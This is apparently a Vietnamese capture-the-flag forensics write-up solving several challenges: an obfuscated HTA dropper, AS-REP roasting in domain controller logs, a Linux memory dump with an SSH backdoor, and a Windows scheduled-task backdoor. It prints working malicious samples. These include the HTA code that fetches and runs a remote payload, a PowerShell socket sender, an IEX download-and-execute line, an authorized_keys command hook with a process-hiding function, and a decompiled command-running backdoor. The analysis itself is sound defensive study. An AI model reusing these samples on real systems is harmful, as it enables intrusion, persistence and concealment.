![image](https://hackmd.io/_uploads/BJwdpe5Ckl.png)
## Hello 
##### Bài này cung cấp cho chúng ta 1 file hta bị obfuscated
```js
<!DOCTYPE html><html><head><title>Challenge MIDNIGHHHTT</title><HTA:APPLICATION ID="Challenge MIDNIGHHHTT" APPLICATIONNAME="Challenge MIDNIGHHHTT" BORDER="thin" BORDERSTYLE="normal" CAPTION="yes" ICON="" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="yes" SINGLEINSTANCE="yes" SYSMENU="yes" WINDOWSTATE="normal"><script type="text/javascript">function _0x47c6(){var _0x24b5fe=['charCodeAt','2018493vyzWaQ','GET','1199740ZZkZMB','1113zrFMpW','983352JhRqSq','11GLgYUF','2042286SJcWYB','W1N','length','16kWycOk','status','LmxhbWFyci5iemgv','fromCharCode','25086eTSMGS','V1NjcmlwdC5TaGVsbAo=','2561550lxjKXE','563001FUFdqY','open','aHR0cHM6Ly9tY3Rm','send','4AXEFkT'];_0x47c6=function(){return _0x24b5fe;};return _0x47c6();}function _0x44d2(_0x42f8c7,_0x8488ed){var _0x47c61e=_0x47c6();return _0x44d2=function(_0x44d20f,_0x146a27){_0x44d20f=_0x44d20f-0x16a;var _0x3e9d64=_0x47c61e[_0x44d20f];return _0x3e9d64;},_0x44d2(_0x42f8c7,_0x8488ed);}(function(_0x363748,_0x2cce7f){var _0x3c7483=_0x44d2,_0x132437=_0x363748();while(!![]){try{var _0x29fe2c=-parseInt(_0x3c7483(0x17f))/0x1+parseInt(_0x3c7483(0x173))/0x2+-parseInt(_0x3c7483(0x175))/0x3+parseInt(_0x3c7483(0x16d))/0x4*(parseInt(_0x3c7483(0x171))/0x5)+-parseInt(_0x3c7483(0x17c))/0x6*(-parseInt(_0x3c7483(0x172))/0x7)+-parseInt(_0x3c7483(0x178))/0x8*(-parseInt(_0x3c7483(0x16f))/0x9)+-parseInt(_0x3c7483(0x17e))/0xa*(parseInt(_0x3c7483(0x174))/0xb);if(_0x29fe2c===_0x2cce7f)break;else _0x132437['push'](_0x132437['shift']());}catch(_0x28a4fc){_0x132437['push'](_0x132437['shift']());}}}(_0x47c6,0x543cf),(function(){var _0x584c3e=_0x44d2;function _0x34f9b4(_0x3215f4){return atob(_0x3215f4);}function _0xc1e5d1(_0x3f15e1){var _0x4ed775='';for(var _0xf35ea5=0x0;_0xf35ea5<_0x3f15e1['length'];_0xf35ea5++){_0x4ed775+=_0x3f15e1[_0xf35ea5];}return _0x4ed775;}function _0x377f01(_0x297534,_0x16c885){var _0x40528a=_0x44d2,_0x5abc45='';for(var _0x581cac=0x0;_0x581cac<_0x297534[_0x40528a(0x177)];_0x581cac++){_0x5abc45+=String[_0x40528a(0x17b)](_0x297534[_0x40528a(0x16e)](_0x581cac)^_0x16c885);}return _0x5abc45;}var _0x5295f9='TVNYTDIuWE1MSFhM',_0x42f735=_0x34f9b4(_0x5295f9),_0x871fec=new ActiveXObject(_0x42f735),_0xc3fb0e=[_0x584c3e(0x16b),_0x584c3e(0x17a),'Q0ZjR0ZDR2du'],_0x25f746=_0xc1e5d1(_0xc3fb0e),_0x16b3fc=_0x34f9b4(_0x25f746);_0x871fec[_0x584c3e(0x16a)](_0x584c3e(0x170),_0x16b3fc,![]),_0x871fec[_0x584c3e(0x16c)]();if(_0x871fec[_0x584c3e(0x179)]==0xc8){var _0x462594=_0x871fec['responseText'],_0x32ebbf=_0x377f01(_0x462594,0x42),_0x439677=[_0x584c3e(0x176),_0x584c3e(0x17d)],_0x66a026=_0x34f9b4(_0x439677[0x1]);new ActiveXObject(_0x66a026)['Run'](_0x32ebbf,0x0,!![]);}else throw new Error(_0x871fec[_0x584c3e(0x179)]);}()));</script></head><body></body></html>
```
##### Đây là mã sau khi deobfuscate
```js
function getObfuscatedArray() {
  var arr = [
    "charCodeAt", "2018493vyzWaQ", "GET", "1199740ZZkZMB", "1113zrFMpW", "983352JhRqSq",
    "11GLgYUF", "2042286SJcWYB", "W1N", "length", "16kWycOk", "status", "LmxhbWFyci5iemgv",
    "fromCharCode", "25086eTSMGS", "V1NjcmlwdC5TaGVsbAo=", "2561550lxjKXE", "563001FUFdqY",
    "open", "aHR0cHM6Ly9tY3Rm", "send", "4AXEFkT"
  ];
  getObfuscatedArray = function () {
    return arr;
  };
  return arr;
}

function resolveIndex(index, _unused) {
  var array = getObfuscatedArray();
  return resolveIndex = function (i, _unused2) {
    i = i - 362;
    return array[i];
  }, resolveIndex(index, _unused);
}

(function (getArrayFunc, targetValue) {
  var resolve = resolveIndex, array = getArrayFunc();
  while (true) {
    try {
      var result = -parseInt(resolve(383)) / 1 +
                   parseInt(resolve(371)) / 2 +
                   -parseInt(resolve(373)) / 3 +
                   parseInt(resolve(365)) / 4 * (parseInt(resolve(369)) / 5) +
                   -parseInt(resolve(380)) / 6 * (-parseInt(resolve(370)) / 7) +
                   -parseInt(resolve(376)) / 8 * (-parseInt(resolve(367)) / 9) +
                   -parseInt(resolve(382)) / 10 * (parseInt(resolve(372)) / 11);
      if (result === targetValue) break;
      else array.push(array.shift());
    } catch (err) {
      array.push(array.shift());
    }
  }
}(getObfuscatedArray, 345039));

(function () {
  var resolve = resolveIndex;

  function concatStrings(arr) {
    var str = "";
    for (var i = 0; i < arr.length; i++) {
      str += arr[i];
    }
    return str;
  }

  function xorDecrypt(input, key) {
    var decrypted = "";
    for (var i = 0; i < input.length; i++) {
      decrypted += String[resolve(379)](input[resolve(366)](i) ^ key);
    }
    return decrypted;
  }

  var progIdBase64 = "TVNYTDIuWE1MSFhM";
  var progId = atob(progIdBase64); // "MSXML2.XMLHTTP"
  var httpRequest = new ActiveXObject(progId);

  var urlParts = [resolve(363), resolve(378), "Q0ZjR0ZDR2du"]; // ["aHR0cHM6Ly9tY3Rm", "LmxhbWFyci5iemgv", "Q0ZjR0ZDR2du"]
  var fullUrl = atob(concatStrings(urlParts)); // "https://mctf.lamarr.bzh/CFcGFCGgn"
  
  httpRequest[resolve(362)](resolve(368), fullUrl, false); // open("GET", url, false)
  httpRequest[resolve(364)](); // send()
  
  if (httpRequest[resolve(377)] == 200) {
    var responseText = httpRequest.responseText;
    var decoded = xorDecrypt(responseText, 66);
    var shellParts = [resolve(374), resolve(381)]; // ["W1N", "V1NjcmlwdC5TaGVsbAo="]
    var shellProgId = atob(shellParts[1]); // "WScript.Shell"
    new ActiveXObject(shellProgId).Run(decoded, 0, true);
  } else {
    throw new Error(httpRequest[resolve(377)]);
  }
})();
```
##### Đoạn mã giải mã chuỗi "TVNYTDIuWE1MSFhM" → "MSXML2.XMLHTTP" để tạo một HTTP request. 
##### Sau đó tạo URL bằng cách nối và giải mã base64 chuỗi "aHR0cHM6Ly9tY3RmLmxhbWFyci5iemgvQ0ZjR0ZDR2du" → "https://mctf.lamarr.bzh/CFcGFCGgn".
##### Gửi request đến URL đó. Nếu nhận mã 200, thì XOR từng ký tự response với 66, rồi chạy kết quả bằng WScript.Shell.
![image](https://hackmd.io/_uploads/B1iX219Rkl.png)
##### Sau khi xor ta tiếp tục thu thêm 1 payload nữa, chúng thực thi đoạn base64 bị encode
##### Sau khi decode ta sẽ thu được payload độc hại
```powershell
$zF=[Text.Encoding]::UTF8;$qW=[Convert]::FromBase64String("ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg==");$jR=$zF.GetString($qW);$tG="MyS3cr3t";$rF="";0..($jR.Length-1)|%{ $rF+=[char](([int][char]$jR[$_]) -bxor ([int][char]$tG[$_%$tG.Length]))};$yT=New-Object Net.Sockets.TcpClient("192.168.1.100",4444);$pO=$yT.GetStream();$iJ=New-Object IO.StreamWriter($pO);$iJ.Write($rF);$iJ.Flush();$yT.Close();
```
##### Đoạn mã giải mã chuỗi `ADoHdRg9URIYKjAHF0MDGhJIZmwgIFIVLBgyUgITUhU3AwpqHg==` sau đó xor với key "MyS3cr3t", và cuối cùng là tạo socket với 192.168.1.100:4444
![image](https://hackmd.io/_uploads/BJmNpk9Rye.png)
> Flag : MCTF{ObfUSc4t10n_15_CRaaaaaaaaaazzYY}

## Empire sous Frozen
### Description 
> We believe an attacker has broken into the Empire’s Active Directory domain. The empire office provides you with logs of a domain controller (DC) in order to understand what happened. Your objective is to determine how the attacker obtained initial access to our domain:
![image](https://hackmd.io/_uploads/rkJoAkc01x.png)
### Solution
##### Bài này cung cấp cho ta 1 file txt bao gồm log của `Microsoft-Windows-Security-Auditing`
##### Bước đầu tiên mình lọc các ip đăng nhập không thành công 
> strings empire_sous_frozen.txt | grep -i "Audit Fail" -A 17 | grep "Client Address"
![image](https://hackmd.io/_uploads/H146uKc0yl.png)
##### Có thể thấy rằng ip `172.16.100.253` đăng nhập không thành công liên tục vào hệ thống, điều này cho thấy 1 cuộc tấn công bruteforce đang diễn ra. 
##### Lọc các tên đăng nhập thành công từ ip này bằng lệnh : 
> strings empire_sous_frozen.txt | grep -i "Suc" -A 17 | grep -i "172.16.100.253" -B 20
![image](https://hackmd.io/_uploads/BJiHFt5AJl.png)
##### Bước đầu xác định được user trooper đã bị xâm phạm.
![image](https://hackmd.io/_uploads/Sk7MZq90yx.png)
##### Nhìn vào đây ta có thể thấy 1 vài dấu hiệu ro ràng về cuộc tấn công : 
- Tấn công bruteforce qua Active Directory (Kerberos)
- Pre-Authentication Type là 0 
```
Pre-Authentication Type là 0  nghĩa là Không sử dụng bất kỳ dữ liệu pre-auth nào.

Tức là client gửi yêu cầu AS-REQ mà không kèm theo dữ liệu xác thực trước (pre-auth data)
```
- Attacker từ IP 172.16.100.253 đã yêu cầu vé và nhận được ciphertext.
##### Dựa vào đây ta có thể xác định được tên cuộc tấn công là `AS-REP Roasting`
> Flag : MCTF{trooper:asreproasting}


## APT 1137
### Description
> I think the server is compromised, I'm noticing weird things when I ssh into my server, that's probably where I need to start looking!
### Solution
##### Bài này cung cấp cho chúng ta 1 file zip, giải nén ra ta được 1 file apt-1337.lime và 1 file symboles-6.1.0-29-amd64.json
##### File apt-1337.lime là file dump bộ nhớ RAM (memory dump) được tạo ra bằng LiME (Linux Memory Extractor), còn file còn lại là file symbols của nó để dùng cho volatility3 (đưa file này vào volatility3/volatility3/symbols/linux)
##### Mở nó với volatility3 bằng plugin linux.bash trước.
![image](https://hackmd.io/_uploads/SJ--zec0ke.png)
##### Có vẻ đây là lệnh dump RAM sau khi cuộc tấn công xảy ra nên không cần chú ý quá nhiều
##### Tiếp tục với plugin `linux.psaux.PsAux`
![image](https://hackmd.io/_uploads/B14B4xc0Je.png)
##### Có 1 vài điểm đáng chú ý ở đây, file .ssh/authorized_keys đang được theo dõi bằng lệnh tail, thêm nữa các tiến trình ssh cho thấy ssh đang hoạt động
##### Vì tiêu đề là APT 1337 nên bước đầu mình sẽ xác định cơ chế persistence trước, dựa vào bảng này 
![fall1](https://hackmd.io/_uploads/r13_Se5Akl.png)
##### Ở bảng User Accounts có đề cập tới file authorized_keys
> https://attack.mitre.org/techniques/T1098/004/
##### Bây giờ dùng plugin `linux.pagecache.RecoverFs` để dump file này ra rồi xem dữ liệu bên trong file authorized_keys
![image](https://hackmd.io/_uploads/rkxvwx9Ryl.png)
##### Và đây là đoạn dữ liệu bên trong 
```bash
command="eval \"\$(echo 686964652829207b0a202020205b5b202d4c202f6574632f6d746162205d5d202626207b206370202f6574632f6d746162202f6574632f6d7461622e62616b3b206d76202f6574632f6d7461622e62616b202f6574632f6d7461623b207d0a202020205f7069643d247b313a2d24247d0a202020205b5b20245f706964203d7e205e5b302d395d2b24205d5d202626207b206d6f756e74202d6e202d2d62696e64202f6465762f73686d202f70726f632f245f706964202626206563686f20225b5448435d2050494420245f706964206973206e6f772068696464656e223b2072657475726e3b207d0a202020206c6f63616c205f6172677374720a20202020666f72205f7820696e2022247b403a327d223b20646f205f6172677374722b3d222027247b5f782f2f5c272f5c275c225c275c225c277d27223b20646f6e650a202020205b5b20242862617368202d6320227073202d6f20737461743d202d70205c245c242229203d7e205c2b205d5d207c7c20657865632062617368202d6320226d6f756e74202d6e202d2d62696e64202f6465762f73686d202f70726f632f5c245c243b2065786563205c2224315c2220245f617267737472220a2020202062617368202d6320226d6f756e74202d6e202d2d62696e64202f6465762f73686d202f70726f632f5c245c243b2065786563205c2224315c2220245f617267737472220a7d0a0a68696465202f7573722f7362696e2f6461656d6f6e20260a | xxd -r -p) & ssh user@192.168.1.38\"" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCtHVO97vah6BOUgl6pYgi+X+Iru7Vocs5zupRxxncdvg8xhuDn3SWbFMIu4HjBQNt6x7LyvB7MvJ8laxgottrcgHJbuQ8+pwW9CJI2Z8f/UOj3+AlUrjkz8LiCN+4p030HvSIMonFSP32kk5pYb9Y7toLK6k4hfbkwh6e1zIRlUyFcr3hQ5C3Kor5vHxPpnG6MfxpvxbbzBZ++uqOY0Z7JQ6n24FJQuqVYAALENsjHPQWhBV76ktRyq8i/cv0ijQ5pQ2QcE3NK/zYd70LbUm+VbtS+WQ5xurd/tx9QvwpH9MBjmMmF5nmdyCKKsG9KcW7LrLxKlidh1PURSxrgMR1Jcsyq3iFvCW+oD9RNWGOiu6ROnEOwMOi/EAxpo12KydIyBLkEPDWPEhu292Es9Lf01H/jjTtPNJcYFfj5thrap+jGRedIxwFyEXpjDz1KrSMZX7UCoiUYJXA78bzs+QNP7+ADWdXkc9YJBTnGT+IYScy6h6Wba8FhMRqhSxXPYjuxakPgfYSx4qitA5+Na64c3bZk5qmKwsa16e79bZcImSDLXyWaSGsvLP9YkpCIABZZuBDJdvjbXBrx7oSj2mt4FXGLNCt2y3flOOFBGD2nwg9Crs8xaXvb2XNv5P9mDB4XnKl3JspwdZBy23Ve/PoyPh9/NJlE9PjIKL9P3Terjw== user@midnight
```
##### Khi tài khoản bị backdoor SSH key này được sử dụng để SSH vào máy, nó không mở shell bình thường mà nó sẽ giải mã đoạn hex trong hàm echo và thực thi
##### Đoạn hex sau khi decode sẽ như sau 
```bash=
hide() {
    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
    _pid=${1:-$$}
    [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
    local _argstr
    for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
    [[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
    bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}

hide /usr/sbin/daemon &
```
##### Hàm hide khi được gọi với đối số /usr/sbin/daemon, sẽ thực thi tiến trình này trong một shell mới, sau đó bind mount thư mục /dev/shm vào /proc/$$ của tiến trình đó, khiến các thông tin về tiến trình bị ẩn hoặc không thể truy cập qua /proc, từ đó làm cho tiến trình trở nên khó bị phát hiện bởi các công cụ như ps, top, hay ls /proc.
##### Bây giờ kiểm tra xem `/usr/sbin/daemon` có gì mà phải ẩn đi, mình dùng ida để rev
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _QWORD *v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rbx
  __int64 v7; // rbx
  __int64 v8; // rbx
  __int64 v9; // rbx
  __int64 v10; // rbx
  __int64 v11; // rbx
  __int64 v12; // rbx
  __int64 v13; // rbx
  int fd; // [rsp+0h] [rbp-4C0h]
  int v15; // [rsp+4h] [rbp-4BCh]
  unsigned __int64 i; // [rsp+8h] [rbp-4B8h]
  char *v17; // [rsp+10h] [rbp-4B0h]
  char *v18; // [rsp+18h] [rbp-4A8h]
  time_t v19; // [rsp+20h] [rbp-4A0h]
  tm tp; // [rsp+30h] [rbp-490h] BYREF
  _BYTE v21[16]; // [rsp+70h] [rbp-450h] BYREF
  char v22[32]; // [rsp+80h] [rbp-440h] BYREF
  char command[1032]; // [rsp+A0h] [rbp-420h] BYREF
  unsigned __int64 v24; // [rsp+4A8h] [rbp-18h]

  v24 = __readfsqword(40u);
  fd = open("/tmp/.dat", 66, 384LL);
  if ( fd < 0 )
    return 1;
  if ( ftruncate(fd, 152LL) )
    return 1;
  zXb4W = (__int64)mmap(0LL, 152uLL, 3, 1, fd, 0LL);
  if ( zXb4W == -1 )
    return 1;
  v4 = (_QWORD *)zXb4W;
  v5 = qword_4028;
  *(_QWORD *)zXb4W = original_data;
  v4[1] = v5;
  v6 = qword_4038;
  v4[2] = qword_4030;
  v4[3] = v6;
  v7 = qword_4048;
  v4[4] = qword_4040;
  v4[5] = v7;
  v8 = qword_4058;
  v4[6] = qword_4050;
  v4[7] = v8;
  v9 = qword_4068;
  v4[8] = qword_4060;
  v4[9] = v9;
  v10 = qword_4078;
  v4[10] = qword_4070;
  v4[11] = v10;
  v11 = qword_4088;
  v4[12] = qword_4080;
  v4[13] = v11;
  v12 = qword_4098;
  v4[14] = qword_4090;
  v4[15] = v12;
  v13 = qword_40A8;
  v4[16] = qword_40A0;
  v4[17] = v13;
  v4[18] = qword_40B0;
  v17 = getenv("AES_KEY");
  v18 = getenv("AES_IV");
  if ( !v17 || !v18 )
    return 1;
  if ( (unsigned int)vNh3Z(v17, v22, 32LL) != 32 || (unsigned int)vNh3Z(v18, v21, 16LL) != 16 )
    return 1;
  v19 = time(0LL);
  memset(&tp, 0, 20);
  memset(&tp.tm_wday, 0, 32);
  tp.tm_year = 1100;
  tp.tm_mday = 1;
  if ( v19 < mktime(&tp) )
  {
    while ( 1 )
LABEL_20:
      sleep(1u);
  }
  for ( i = 0LL; i <= 0x97; ++i )
    *(_BYTE *)(zXb4W + i) ^= 170u;
  v15 = pTq7L(zXb4W, 152LL, v22, v21, command);
  if ( v15 >= 0 )
  {
    command[v15] = 0;
    system(command);
    goto LABEL_20;
  }
  return 1;
}
```
##### Đầu tiên nó mở file .dat bằng `fd = open("/tmp/.dat", 66, 384LL);`
##### Xor dữ liệu với 0xAA
```C
for ( i = 0LL; i <= 0x97; ++i )
  *(_BYTE *)(zXb4W + i) ^= 0xAAu;
```
##### Rồi dùng hàm pTq7L để giải mã aes, với key và iv được lấy từ biến môi trường (có thể lấy bằng pulgin linux.envars.Envars)
```C
  v17 = getenv("AES_KEY");
  v18 = getenv("AES_IV");
```
![image](https://hackmd.io/_uploads/HJUJ6e5AJe.png)
```C
v15 = pTq7L(zXb4W, 152LL, v22, v21, command);
```
##### Cuối cùng là thực thi nó 
```C
if ( v15 >= 0 )
{
  command[v15] = 0;
  system(command);
  goto LABEL_20;
}
```
##### Sử dụng cyberchef để giải mã 
![image](https://hackmd.io/_uploads/H1WfTecAJg.png)
> Flag : MCTF{1n0d3_4nd_v0l4t1lity_4re_r3alLY_P0w3rfu11}


## Blackdoor 1/2
### Description
```
In the neon-lit depths of Neon City, a rogue NeuraTek insider has leaked a compromised workstation used by Nexus engineers. Rumors suggest a hidden backdoor within the system.

Your mission is to analyze the machine, track down the malicious binary, and retrieve its MD5 hash.
Unmask the ghost in the machine before NeuraTek covers its tracks!

PS : the attacker changed the password of the machine, you'll have to find a way to bypass it yourself.
ZIP password: insurrection
md5sum of the OVA file: 807e738fb8e457caef0c974f9c557d4e

Format : MCTF{hash}
Author : PhoeniX
```
### Solution 
##### Challenge này cung cấp cho chúng ta 1 file ova để ta mở trên máy ảo. Tuy nhiên mật khẩu đã bị attacker đổi
##### Dựa vào nguồn từ trang này : https://www.sciencechronicle.org/en/article/how-to-reset-windows-password-in-virtual-box ta có thể bypass được mật khẩu windows thông qua virtualbox
##### Sau khi truy cập vào được máy của nạn nhân, mình tiến hành check evtx log để xem các dữ liệu khả nghi, tại powershell mình thấy 1 đoạn như sau
![image](https://hackmd.io/_uploads/BJXfHM5Aye.png)
##### Sau khi decode sẽ là `IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1/exploit.ps1')`
##### Sử dụng công cụ autoruns, thấy rằng có 1 vài scheduled đang chạy 
![image](https://hackmd.io/_uploads/S14pCc90kl.png)
##### 1 schedule có tên `Calibration Loader` chạy từ 1 file dll khá đáng ngờ
![image](https://hackmd.io/_uploads/BJOSJocR1l.png)
![image](https://hackmd.io/_uploads/rJVN-sqAyx.png)
##### Tìm trên virustotal thì thấy file này bị gắn cờ độc hại 
![image](https://hackmd.io/_uploads/SktYZjqAyl.png)
> Flag : MCTF{04c740418760eb3cdd738a4480337e03}
## Blackdoor 2/2
### Description
```
You've uncovered the backdoored binary, but NeuraTek's deception runs deeper. The malicious program isn’t just lying dormant—it’s executed on a schedule, hidden within the system’s task scheduler.

Your next objective:
Trace the scheduled task responsible for running the backdoor and extract its unique Task Scheduler ID. Follow the digital breadcrumbs before NeuraTek wipes the evidence!

PS : The given file is the same as the first part.

ZIP password: insurrection  md5sum of the OVA file: 807e738fb8e457caef0c974f9c557d4e

Format : MCTF{ID}
Author : PhoeniX
```
### Solution
##### Dựa vào đường dẫn dẫn đến tệp dll, tìm nó trên registry 
![image](https://hackmd.io/_uploads/SJtgLs5R1e.png)
> Flag : MCTF{B210D694-C8DF-490D-9576-9E20CDBC20BD}


